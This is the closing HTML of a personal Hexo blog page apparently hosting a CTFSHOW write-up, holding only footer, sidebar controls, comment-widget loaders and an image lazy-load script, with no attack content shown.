data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/%E6%9C%AA%E9%97%BB%E8%8A%B1%E5%90%8D_48518498.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="PHP-FPM攻击详解"/></a><div class="content"><a class="title" href="/2022/09/25/PHP-FPM%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3/" title="PHP-FPM攻击详解">PHP-FPM攻击详解</a><time datetime="2022-09-25T09:53:24.000Z" title="发表于 2022-09-25 17:53:24">2022-09-25</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By Yake_呆瓜</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">愿你有一天能和你重要的人早日相遇</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'TieUOuIwaBZb4edJcJ1C02ka-gzGzoHsz',
      appKey: 'eJRGo87LLpxMlIWKemPvjBtH',
      avatar: 'monsterid',
      serverURLs: 'https://tieuouiw.lc-cn-n1-shared.com',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://yake-daigua.top/2022/10/31/CTFSHOW_WP(1-197)/'
    this.page.identifier = '/2022/10/31/CTFSHOW_WP(1-197)/'
    this.page.title = '　CTFSHOW_WP(1-197)'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }

  document.getElementById('darkmode').addEventListener('click', () => {
    setTimeout(() => window.disqusReset(), 200)
  })
}

if ('Valine' === 'Disqus' || !true) {
  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script src="https://cdn.jsdelivr.net/gh/lete114/CDN/js/upjiang.js"></script><script type="text/javascript" src="/js/fairyDustCursor.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div>
        <style>
            [bg-lazy] {
                background-image: none !important;
                background-color: #eee !important;
            }
        </style>
        <script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(e){e.imageLazyLoadSetting.processImages=t;var n=e.imageLazyLoadSetting.isSPA,i=e.imageLazyLoadSetting.preloadRatio||1,r=o();function o(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){n&&(r=o());for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(e.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];e=function(){r=r.filter(function(t){return o!==t})},(t=o).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,t.removeAttribute("data-original"),e&&e()},t.src!==i&&(n.src=i))}()}function a(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",a),e.addEventListener("resize",a),e.addEventListener("orientationchange",a)}(this);</script></body></html>